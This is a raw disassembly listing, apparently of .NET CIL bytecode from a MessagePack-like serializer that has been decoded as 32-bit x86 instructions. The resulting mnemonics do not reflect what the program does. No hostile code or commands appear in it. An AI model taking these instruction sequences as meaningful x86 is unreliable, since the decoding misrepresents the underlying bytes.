  4051bc:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051c1:	2a 06                	sub    (%esi),%al
  4051c3:	20 de                	and    %bl,%dh
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	00 40 55             	add    %al,0x55(%eax)
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	00 18                	add    %bl,(%eax)
  4051ce:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051d2:	01 0b                	add    %ecx,(%ebx)
  4051d4:	03 07                	add    (%edi),%eax
  4051d6:	16                   	push   %ss
  4051d7:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	0a 26                	or     (%esi),%ah
  4051de:	07                   	pop    %es
  4051df:	28 58 00             	sub    %bl,0x0(%eax)
  4051e2:	00 06                	add    %al,(%esi)
  4051e4:	0b 07                	or     (%edi),%eax
  4051e6:	16                   	push   %ss
  4051e7:	28 07                	sub    %al,(%edi)
  4051e9:	01 00                	add    %eax,(%eax)
  4051eb:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051ee:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051f1:	00 06                	add    %al,(%esi)
  4051f3:	02 18                	add    (%eax),%bl
  4051f5:	7d 36                	jge    0x40522d
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	04 16                	add    $0x16,%al
  4051fb:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405200:	00 02                	add    %al,(%edx)
  405202:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405206:	06                   	push   %es
  405207:	25 03 28 96 00       	and    $0x962803,%eax
  40520c:	00 06                	add    %al,(%esi)
  40520e:	6f                   	outsl  %ds:(%esi),(%dx)
  40520f:	6a 00                	push   $0x0
  405211:	00 06                	add    %al,(%esi)
  405213:	03 6f 88             	add    -0x78(%edi),%ebp
  405216:	00 00                	add    %al,(%eax)
  405218:	06                   	push   %es
  405219:	09 17                	or     %edx,(%edi)
  40521b:	58                   	pop    %eax
  40521c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405221:	2a 06                	sub    (%esi),%al
  405223:	20 df                	and    %bl,%bh
  405225:	00 00                	add    %al,(%eax)
  405227:	00 40 55             	add    %al,0x55(%eax)
  40522a:	00 00                	add    %al,(%eax)
  40522c:	00 1a                	add    %bl,(%edx)
  40522e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405232:	01 0b                	add    %ecx,(%ebx)
  405234:	03 07                	add    (%edi),%eax
  405236:	16                   	push   %ss
  405237:	1a 6f 45             	sbb    0x45(%edi),%ch
  40523a:	00 00                	add    %al,(%eax)
  40523c:	0a 26                	or     (%esi),%ah
  40523e:	07                   	pop    %es
  40523f:	28 58 00             	sub    %bl,0x0(%eax)
  405242:	00 06                	add    %al,(%esi)
  405244:	0b 07                	or     (%edi),%eax
  405246:	16                   	push   %ss
  405247:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40524b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40524e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405251:	00 06                	add    %al,(%esi)
  405253:	02 18                	add    (%eax),%bl
  405255:	7d 36                	jge    0x40528d
  405257:	00 00                	add    %al,(%eax)
  405259:	04 16                	add    $0x16,%al
  40525b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405260:	00 02                	add    %al,(%edx)
  405262:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405266:	06                   	push   %es
  405267:	25 03 28 96 00       	and    $0x962803,%eax
  40526c:	00 06                	add    %al,(%esi)
  40526e:	6f                   	outsl  %ds:(%esi),(%dx)
  40526f:	6a 00                	push   $0x0
  405271:	00 06                	add    %al,(%esi)
  405273:	03 6f 88             	add    -0x78(%edi),%ebp
  405276:	00 00                	add    %al,(%eax)
  405278:	06                   	push   %es
  405279:	09 17                	or     %edx,(%edi)
  40527b:	58                   	pop    %eax
  40527c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405281:	2a 06                	sub    (%esi),%al
  405283:	20 da                	and    %bl,%dl
  405285:	00 00                	add    %al,(%eax)
  405287:	00 40 0e             	add    %al,0xe(%eax)
  40528a:	00 00                	add    %al,(%eax)
  40528c:	00 02                	add    %al,(%edx)
  40528e:	06                   	push   %es
  40528f:	03 28                	add    (%eax),%ebp
  405291:	97                   	xchg   %eax,%edi
  405292:	00 00                	add    %al,(%eax)
  405294:	06                   	push   %es
  405295:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40529b:	06                   	push   %es
  40529c:	20 db                	and    %bl,%bl
  40529e:	00 00                	add    %al,(%eax)
  4052a0:	00 40 0e             	add    %al,0xe(%eax)
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	00 02                	add    %al,(%edx)
  4052a7:	06                   	push   %es
  4052a8:	03 28                	add    (%eax),%ebp
  4052aa:	97                   	xchg   %eax,%edi
  4052ab:	00 00                	add    %al,(%eax)
  4052ad:	06                   	push   %es
  4052ae:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052b4:	06                   	push   %es
  4052b5:	20 d0                	and    %dl,%al
  4052b7:	00 00                	add    %al,(%eax)
  4052b9:	00 40 0f             	add    %al,0xf(%eax)
  4052bc:	00 00                	add    %al,(%eax)
  4052be:	00 02                	add    %al,(%edx)
  4052c0:	03 6f 00             	add    0x0(%edi),%ebp
  4052c3:	01 00                	add    %eax,(%eax)
  4052c5:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c8:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052cc:	06                   	push   %es
  4052cd:	2a 06                	sub    (%esi),%al
  4052cf:	20 d1                	and    %dl,%cl
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	00 40 27             	add    %al,0x27(%eax)
  4052d6:	00 00                	add    %al,(%eax)
  4052d8:	00 18                	add    %bl,(%eax)
  4052da:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052de:	01 0b                	add    %ecx,(%ebx)
  4052e0:	03 07                	add    (%edi),%eax
  4052e2:	16                   	push   %ss
  4052e3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052e6:	00 00                	add    %al,(%eax)
  4052e8:	0a 26                	or     (%esi),%ah
  4052ea:	07                   	pop    %es
  4052eb:	28 58 00             	sub    %bl,0x0(%eax)
  4052ee:	00 06                	add    %al,(%esi)
  4052f0:	0b 02                	or     (%edx),%eax
  4052f2:	07                   	pop    %es
  4052f3:	16                   	push   %ss
  4052f4:	28 07                	sub    %al,(%edi)
  4052f6:	01 00                	add    %eax,(%eax)
  4052f8:	0a 6a 28             	or     0x28(%edx),%ch
  4052fb:	74 00                	je     0x4052fd
  4052fd:	00 06                	add    %al,(%esi)
  4052ff:	2a 06                	sub    (%esi),%al
  405301:	20 d2                	and    %dl,%dl
  405303:	00 00                	add    %al,(%eax)
  405305:	00 40 27             	add    %al,0x27(%eax)
  405308:	00 00                	add    %al,(%eax)
  40530a:	00 1a                	add    %bl,(%edx)
  40530c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405310:	01 0b                	add    %ecx,(%ebx)
  405312:	03 07                	add    (%edi),%eax
  405314:	16                   	push   %ss
  405315:	1a 6f 45             	sbb    0x45(%edi),%ch
  405318:	00 00                	add    %al,(%eax)
  40531a:	0a 26                	or     (%esi),%ah
  40531c:	07                   	pop    %es
  40531d:	28 58 00             	sub    %bl,0x0(%eax)
  405320:	00 06                	add    %al,(%esi)
  405322:	0b 02                	or     (%edx),%eax
  405324:	07                   	pop    %es
  405325:	16                   	push   %ss
  405326:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40532a:	0a 6a 28             	or     0x28(%edx),%ch
  40532d:	74 00                	je     0x40532f
  40532f:	00 06                	add    %al,(%esi)
  405331:	2a 06                	sub    (%esi),%al
  405333:	20 d3                	and    %dl,%bl
  405335:	00 00                	add    %al,(%eax)
  405337:	00 40 25             	add    %al,0x25(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	00 1e                	add    %bl,(%esi)
  40533e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405342:	01 0b                	add    %ecx,(%ebx)
  405344:	03 07                	add    (%edi),%eax
  405346:	16                   	push   %ss
  405347:	1e                   	push   %ds
  405348:	6f                   	outsl  %ds:(%esi),(%dx)
  405349:	45                   	inc    %ebp
  40534a:	00 00                	add    %al,(%eax)
  40534c:	0a 26                	or     (%esi),%ah
  40534e:	07                   	pop    %es
  40534f:	28 58 00             	sub    %bl,0x0(%eax)
  405352:	00 06                	add    %al,(%esi)
  405354:	0b 02                	or     (%edx),%eax
  405356:	07                   	pop    %es
  405357:	16                   	push   %ss
  405358:	28 08                	sub    %cl,(%eax)
  40535a:	01 00                	add    %eax,(%eax)
  40535c:	0a 28                	or     (%eax),%ch
  40535e:	74 00                	je     0x405360
  405360:	00 06                	add    %al,(%esi)
  405362:	2a 00                	sub    (%eax),%al
  405364:	1b 30                	sbb    (%eax),%esi
  405366:	04 00                	add    $0x0,%al
  405368:	4d                   	dec    %ebp
  405369:	00 00                	add    %al,(%eax)
  40536b:	00 27                	add    %ah,(%edi)
  40536d:	00 00                	add    %al,(%eax)
  40536f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405372:	00 00                	add    %al,(%eax)
  405374:	0a 0a                	or     (%edx),%cl
  405376:	02 06                	add    (%esi),%al
  405378:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  40537e:	6f                   	outsl  %ds:(%esi),(%dx)
  40537f:	e2 00                	loop   0x405381
  405381:	00 0a                	add    %cl,(%edx)
  405383:	d4 8d                	aam    $0x8d
  405385:	44                   	inc    %esp
  405386:	00 00                	add    %al,(%eax)
  405388:	01 0b                	add    %ecx,(%ebx)
  40538a:	06                   	push   %es
  40538b:	16                   	push   %ss
  40538c:	6a 6f                	push   $0x6f
  40538e:	4e                   	dec    %esi
  40538f:	00 00                	add    %al,(%eax)
  405391:	0a 06                	or     (%esi),%al
  405393:	07                   	pop    %es
  405394:	16                   	push   %ss
  405395:	06                   	push   %es
  405396:	6f                   	outsl  %ds:(%esi),(%dx)
  405397:	e2 00                	loop   0x405399
  405399:	00 0a                	add    %cl,(%edx)
  40539b:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4053a2:	07                   	pop    %es
  4053a3:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a9:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053af:	39 06                	cmp    %eax,(%esi)
  4053b1:	00 00                	add    %al,(%eax)
  4053b3:	00 06                	add    %al,(%esi)
  4053b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b6:	33 00                	xor    (%eax),%eax
  4053b8:	00 0a                	add    %cl,(%edx)
  4053ba:	dc 08                	fmull  (%eax)
  4053bc:	2a 00                	sub    (%eax),%al
  4053be:	00 00                	add    %al,(%eax)
  4053c0:	01 10                	add    %edx,(%eax)
  4053c2:	00 00                	add    %al,(%eax)
  4053c4:	02 00                	add    (%eax),%al
  4053c6:	06                   	push   %es
  4053c7:	00 38                	add    %bh,(%eax)
  4053c9:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053d0:	13 30                	adc    (%eax),%esi
  4053d2:	02 00                	add    (%eax),%al
  4053d4:	ec                   	in     (%dx),%al
  4053d5:	00 00                	add    %al,(%eax)
  4053d7:	00 20                	add    %ah,(%eax)
  4053d9:	00 00                	add    %al,(%eax)
  4053db:	11 02                	adc    %eax,(%edx)
  4053dd:	7b 36                	jnp    0x405415
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	04 0a                	add    $0xa,%al
  4053e3:	06                   	push   %es
  4053e4:	45                   	inc    %ebp
  4053e5:	0c 00                	or     $0x0,%al
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	05 00 00 00 05       	add    $0x5000000,%eax
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	1e                   	push   %ds
  4053fe:	00 00                	add    %al,(%eax)
  405400:	00 30                	add    %dh,(%eax)
  405402:	00 00                	add    %al,(%eax)
  405404:	00 42 00             	add    %al,0x0(%edx)
  405407:	00 00                	add    %al,(%eax)
  405409:	54                   	push   %esp
  40540a:	00 00                	add    %al,(%eax)
  40540c:	00 66 00             	add    %ah,0x0(%esi)
  40540f:	00 00                	add    %al,(%eax)
  405411:	79 00                	jns    0x405413
  405413:	00 00                	add    %al,(%eax)
  405415:	86 00                	xchg   %al,(%eax)
  405417:	00 00                	add    %al,(%eax)
  405419:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  40541f:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  405425:	03 02                	add    (%edx),%eax
  405427:	7b 35                	jnp    0x40545e
  405429:	00 00                	add    %al,(%eax)
  40542b:	04 74                	add    $0x74,%al
  40542d:	38 00                	cmp    %al,(%eax)
  40542f:	00 01                	add    %al,(%ecx)
  405431:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  405437:	03 02                	add    (%edx),%eax
  405439:	7b 35                	jnp    0x405470
  40543b:	00 00                	add    %al,(%eax)
  40543d:	04 a5                	add    $0xa5,%al
  40543f:	68 00 00 01 28       	push   $0x28010000
  405444:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405449:	03 02                	add    (%edx),%eax
  40544b:	7b 35                	jnp    0x405482
  40544d:	00 00                	add    %al,(%eax)
  40544f:	04 a5                	add    $0xa5,%al
  405451:	95                   	xchg   %eax,%ebp
  405452:	00 00                	add    %al,(%eax)
  405454:	01 28                	add    %ebp,(%eax)
  405456:	9f                   	lahf
  405457:	00 00                	add    %al,(%eax)
  405459:	06                   	push   %es
  40545a:	2a 03                	sub    (%ebx),%al
  40545c:	02 7b 35             	add    0x35(%ebx),%bh
  40545f:	00 00                	add    %al,(%eax)
  405461:	04 a5                	add    $0xa5,%al
  405463:	6c                   	insb   (%dx),%es:(%edi)
  405464:	00 00                	add    %al,(%eax)
  405466:	01 28                	add    %ebp,(%eax)
  405468:	9e                   	sahf
  405469:	00 00                	add    %al,(%eax)
  40546b:	06                   	push   %es
  40546c:	2a 03                	sub    (%ebx),%al
  40546e:	02 7b 35             	add    0x35(%ebx),%bh
  405471:	00 00                	add    %al,(%eax)
  405473:	04 a5                	add    $0xa5,%al
  405475:	96                   	xchg   %eax,%esi
  405476:	00 00                	add    %al,(%eax)
  405478:	01 28                	add    %ebp,(%eax)
  40547a:	9c                   	pushf
  40547b:	00 00                	add    %al,(%eax)
  40547d:	06                   	push   %es
  40547e:	2a 03                	sub    (%ebx),%al
  405480:	02 7b 35             	add    0x35(%ebx),%bh
  405483:	00 00                	add    %al,(%eax)
  405485:	04 a5                	add    $0xa5,%al
  405487:	97                   	xchg   %eax,%edi
  405488:	00 00                	add    %al,(%eax)
  40548a:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  40548e:	00 00                	add    %al,(%eax)
  405490:	06                   	push   %es
  405491:	2a 03                	sub    (%ebx),%al
  405493:	02 28                	add    (%eax),%ch
  405495:	77 00                	ja     0x405497
  405497:	00 06                	add    %al,(%esi)
  405499:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  40549f:	03 02                	add    (%edx),%eax
  4054a1:	7b 35                	jnp    0x4054d8
  4054a3:	00 00                	add    %al,(%eax)
  4054a5:	04 74                	add    $0x74,%al
  4054a7:	02 00                	add    (%eax),%al
  4054a9:	00 1b                	add    %bl,(%ebx)
  4054ab:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054b1:	02 03                	add    (%ebx),%al
  4054b3:	28 72 00             	sub    %dh,0x0(%edx)
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 02                	sub    (%edx),%al
  4054ba:	03 28                	add    (%eax),%ebp
  4054bc:	73 00                	jae    0x4054be
  4054be:	00 06                	add    %al,(%esi)
  4054c0:	2a 03                	sub    (%ebx),%al
  4054c2:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c8:	1b 30                	sbb    (%eax),%esi
  4054ca:	03 00                	add    (%eax),%eax
  4054cc:	42                   	inc    %edx
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	00 28                	add    %ch,(%eax)
  4054d1:	00 00                	add    %al,(%eax)
  4054d3:	11 02                	adc    %eax,(%edx)
  4054d5:	0a 16                	or     (%esi),%dl
  4054d7:	0b 06                	or     (%esi),%eax
  4054d9:	12 01                	adc    (%ecx),%al
  4054db:	28 49 00             	sub    %cl,0x0(%ecx)
  4054de:	00 0a                	add    %cl,(%edx)
  4054e0:	02 7b 39             	add    0x39(%ebx),%bh
  4054e3:	00 00                	add    %al,(%eax)
  4054e5:	04 3a                	add    $0x3a,%al
  4054e7:	12 00                	adc    (%eax),%al
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	02 02                	add    (%edx),%al
  4054ed:	02 7b 38             	add    0x38(%ebx),%bh
  4054f0:	00 00                	add    %al,(%eax)
  4054f2:	04 73                	add    $0x73,%al
  4054f4:	63 00                	arpl   %eax,(%eax)
  4054f6:	00 06                	add    %al,(%esi)
  4054f8:	7d 39                	jge    0x405533
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	04 dd                	add    $0xdd,%al
  4054fe:	0d 00 00 00 07       	or     $0x7000000,%eax
  405503:	39 06                	cmp    %eax,(%esi)
  405505:	00 00                	add    %al,(%eax)
  405507:	00 06                	add    %al,(%esi)
  405509:	28 50 00             	sub    %dl,0x0(%eax)
  40550c:	00 0a                	add    %cl,(%edx)
  40550e:	dc 02                	faddl  (%edx)
  405510:	7b 39                	jnp    0x40554b
  405512:	00 00                	add    %al,(%eax)
  405514:	04 2a                	add    $0x2a,%al
  405516:	00 00                	add    %al,(%eax)
  405518:	01 10                	add    %edx,(%eax)
  40551a:	00 00                	add    %al,(%eax)
  40551c:	02 00                	add    (%eax),%al
  40551e:	04 00                	add    $0x0,%al
  405520:	2a 2e                	sub    (%esi),%ch
  405522:	00 0d 00 00 00 00    	add    %cl,0x0
  405528:	13 30                	adc    (%eax),%esi
  40552a:	04 00                	add    $0x0,%al
  40552c:	18 00                	sbb    %al,(%eax)
  40552e:	00 00                	add    %al,(%eax)
  405530:	29 00                	sub    %eax,(%eax)
  405532:	00 11                	add    %dl,(%ecx)
  405534:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  40553a:	0a 02                	or     (%edx),%al
  40553c:	06                   	push   %es
  40553d:	16                   	push   %ss
  40553e:	03 6f 45             	add    0x45(%edi),%ebp
  405541:	00 00                	add    %al,(%eax)
  405543:	0a 26                	or     (%esi),%ah
  405545:	06                   	push   %es
  405546:	28 55 00             	sub    %dl,0x0(%ebp)
  405549:	00 06                	add    %al,(%esi)
  40554b:	2a 13                	sub    (%ebx),%dl
  40554d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405550:	b1 00                	mov    $0x0,%cl
  405552:	00 00                	add    %al,(%eax)
  405554:	2a 00                	sub    (%eax),%al
  405556:	00 11                	add    %dl,(%ecx)
  405558:	14 0a                	adc    $0xa,%al
  40555a:	16                   	push   %ss
  40555b:	0b 02                	or     (%edx),%eax
  40555d:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  405563:	18 00                	sbb    %al,(%eax)
  405565:	00 00                	add    %al,(%eax)
  405567:	02 20                	add    (%eax),%ah
  405569:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  40556e:	0d 00 00 00 02       	or     $0x2000000,%eax
  405573:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405579:	0b 38                	or     (%eax),%edi
  40557b:	72 00                	jb     0x40557d
  40557d:	00 00                	add    %al,(%eax)
  40557f:	02 20                	add    (%eax),%ah
  405581:	d9 00                	flds   (%eax)
  405583:	00 00                	add    %al,(%eax)
  405585:	40                   	inc    %eax
  405586:	0c 00                	or     $0x0,%al
  405588:	00 00                	add    %al,(%eax)
  40558a:	03 6f 00             	add    0x0(%edi),%ebp
  40558d:	01 00                	add    %eax,(%eax)
  40558f:	0a 0b                	or     (%ebx),%cl
  405591:	38 5b 00             	cmp    %bl,0x0(%ebx)
  405594:	00 00                	add    %al,(%eax)
  405596:	02 20                	add    (%eax),%ah
  405598:	da 00                	fiaddl (%eax)
  40559a:	00 00                	add    %al,(%eax)
  40559c:	40                   	inc    %eax
  40559d:	25 00 00 00 18       	and    $0x18000000,%eax
  4055a2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055a6:	01 0a                	add    %ecx,(%edx)
  4055a8:	03 06                	add    (%esi),%eax
  4055aa:	16                   	push   %ss
  4055ab:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	0a 26                	or     (%esi),%ah
  4055b2:	06                   	push   %es
  4055b3:	28 58 00             	sub    %bl,0x0(%eax)
  4055b6:	00 06                	add    %al,(%esi)
  4055b8:	0a 06                	or     (%esi),%al
  4055ba:	16                   	push   %ss
  4055bb:	28 02                	sub    %al,(%edx)
  4055bd:	01 00                	add    %eax,(%eax)
  4055bf:	0a 0b                	or     (%ebx),%cl
  4055c1:	38 2b                	cmp    %ch,(%ebx)
  4055c3:	00 00                	add    %al,(%eax)
  4055c5:	00 02                	add    %al,(%edx)
  4055c7:	20 db                	and    %bl,%bl
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	00 40 20             	add    %al,0x20(%eax)
  4055ce:	00 00                	add    %al,(%eax)
  4055d0:	00 1a                	add    %bl,(%edx)
  4055d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055d6:	01 0a                	add    %ecx,(%edx)
  4055d8:	03 06                	add    (%esi),%eax
  4055da:	16                   	push   %ss
  4055db:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	0a 26                	or     (%esi),%ah
  4055e2:	06                   	push   %es
  4055e3:	28 58 00             	sub    %bl,0x0(%eax)
  4055e6:	00 06                	add    %al,(%esi)
  4055e8:	0a 06                	or     (%esi),%al
  4055ea:	16                   	push   %ss
  4055eb:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055ef:	0a 0b                	or     (%ebx),%cl
  4055f1:	07                   	pop    %es
  4055f2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055f6:	01 0a                	add    %ecx,(%edx)
  4055f8:	03 06                	add    (%esi),%eax
  4055fa:	16                   	push   %ss
  4055fb:	07                   	pop    %es
  4055fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4055fd:	45                   	inc    %ebp
  4055fe:	00 00                	add    %al,(%eax)
  405600:	0a 26                	or     (%esi),%ah
  405602:	06                   	push   %es
  405603:	28 55 00             	sub    %dl,0x0(%ebp)
  405606:	00 06                	add    %al,(%esi)
  405608:	2a 00                	sub    (%eax),%al
  40560a:	00 00                	add    %al,(%eax)
  40560c:	13 30                	adc    (%eax),%esi
  40560e:	04 00                	add    $0x0,%al
  405610:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  405615:	00 00                	add    %al,(%eax)
  405617:	11 03                	adc    %eax,(%ebx)
  405619:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  40561d:	06                   	push   %es
  40561e:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405621:	06                   	push   %es
  405622:	8e 69 0c             	mov    0xc(%ecx),%gs
  405625:	16                   	push   %ss
  405626:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  40562b:	16                   	push   %ss
  40562c:	00 00                	add    %al,(%eax)
  40562e:	00 20                	add    %ah,(%eax)
  405630:	a0 00 00 00 08       	mov    0x8000000,%al
  405635:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405638:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  40563d:	00 00                	add    %al,(%eax)
  40563f:	0a 38                	or     (%eax),%bh
  405641:	80 00 00             	addb   $0x0,(%eax)
  405644:	00 08                	add    %cl,(%eax)
  405646:	20 ff                	and    %bh,%bh
  405648:	00 00                	add    %al,(%eax)
  40564a:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405650:	20 d9                	and    %bl,%cl
  405652:	00 00                	add    %al,(%eax)
  405654:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  40565a:	00 00                	add    %al,(%eax)
  40565c:	0a 08                	or     (%eax),%cl
  40565e:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  405664:	00 00                	add    %al,(%eax)
  405666:	0a 38                	or     (%eax),%bh
  405668:	59                   	pop    %ecx
  405669:	00 00                	add    %al,(%eax)
  40566b:	00 08                	add    %cl,(%eax)
  40566d:	20 ff                	and    %bh,%bh
  40566f:	ff 00                	incl   (%eax)
  405671:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405677:	20 da                	and    %bl,%dl
  405679:	00 00                	add    %al,(%eax)
  40567b:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405681:	00 00                	add    %al,(%eax)
  405683:	0a 08                	or     (%eax),%cl
  405685:	68 28 ef 00 00       	push   $0xef28
  40568a:	0a 28                	or     (%eax),%ch
  40568c:	58                   	pop    %eax
  40568d:	00 00                	add    %al,(%eax)
  40568f:	06                   	push   %es
  405690:	0b 02                	or     (%edx),%eax
  405692:	07                   	pop    %es
  405693:	16                   	push   %ss
  405694:	07                   	pop    %es
  405695:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405698:	4c                   	dec    %esp
  405699:	00 00                	add    %al,(%eax)
  40569b:	0a 38                	or     (%eax),%bh
  40569d:	24 00                	and    $0x0,%al
  40569f:	00 00                	add    %al,(%eax)
  4056a1:	20 db                	and    %bl,%bl
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056ab:	00 00                	add    %al,(%eax)
  4056ad:	0a 08                	or     (%eax),%cl
  4056af:	28 4a 00             	sub    %cl,0x0(%edx)
  4056b2:	00 0a                	add    %cl,(%edx)
  4056b4:	28 58 00             	sub    %bl,0x0(%eax)
  4056b7:	00 06                	add    %al,(%esi)
  4056b9:	0b 02                	or     (%edx),%eax
  4056bb:	07                   	pop    %es
  4056bc:	16                   	push   %ss
  4056bd:	07                   	pop    %es
  4056be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c1:	4c                   	dec    %esp
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	0a 02                	or     (%edx),%al
  4056c6:	06                   	push   %es
  4056c7:	16                   	push   %ss
  4056c8:	06                   	push   %es
  4056c9:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056cc:	4c                   	dec    %esp
  4056cd:	00 00                	add    %al,(%eax)
  4056cf:	0a 2a                	or     (%edx),%ch
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 13                	add    %dl,(%ebx)
  4056d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d8:	94                   	xchg   %eax,%esp
  4056d9:	00 00                	add    %al,(%eax)
  4056db:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056de:	00 11                	add    %dl,(%ecx)
  4056e0:	14 0a                	adc    $0xa,%al
  4056e2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e8:	07                   	pop    %es
  4056e9:	20 ff                	and    %bh,%bh
  4056eb:	00 00                	add    %al,(%eax)
  4056ed:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056f3:	20 c4                	and    %al,%ah
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056fa:	08 6f ee             	or     %ch,-0x12(%edi)
  4056fd:	00 00                	add    %al,(%eax)
  4056ff:	0a 07                	or     (%edi),%al
  405701:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  405704:	08 6f ee             	or     %ch,-0x12(%edi)
  405707:	00 00                	add    %al,(%eax)
  405709:	0a 38                	or     (%eax),%bh
  40570b:	59                   	pop    %ecx
  40570c:	00 00                	add    %al,(%eax)
  40570e:	00 07                	add    %al,(%edi)
  405710:	20 ff                	and    %bh,%bh
  405712:	ff 00                	incl   (%eax)
  405714:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40571a:	20 c5                	and    %al,%ch
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405721:	08 6f ee             	or     %ch,-0x12(%edi)
  405724:	00 00                	add    %al,(%eax)
  405726:	0a 07                	or     (%edi),%al
  405728:	68 28 ef 00 00       	push   $0xef28
  40572d:	0a 28                	or     (%eax),%ch
  40572f:	58                   	pop    %eax
  405730:	00 00                	add    %al,(%eax)
  405732:	06                   	push   %es
  405733:	0a 02                	or     (%edx),%al
  405735:	06                   	push   %es
  405736:	16                   	push   %ss
  405737:	06                   	push   %es
  405738:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40573b:	4c                   	dec    %esp
  40573c:	00 00                	add    %al,(%eax)
  40573e:	0a 38                	or     (%eax),%bh
  405740:	24 00                	and    $0x0,%al
  405742:	00 00                	add    %al,(%eax)
  405744:	20 c6                	and    %al,%dh
  405746:	00 00                	add    %al,(%eax)
  405748:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40574b:	08 6f ee             	or     %ch,-0x12(%edi)
  40574e:	00 00                	add    %al,(%eax)
  405750:	0a 07                	or     (%edi),%al
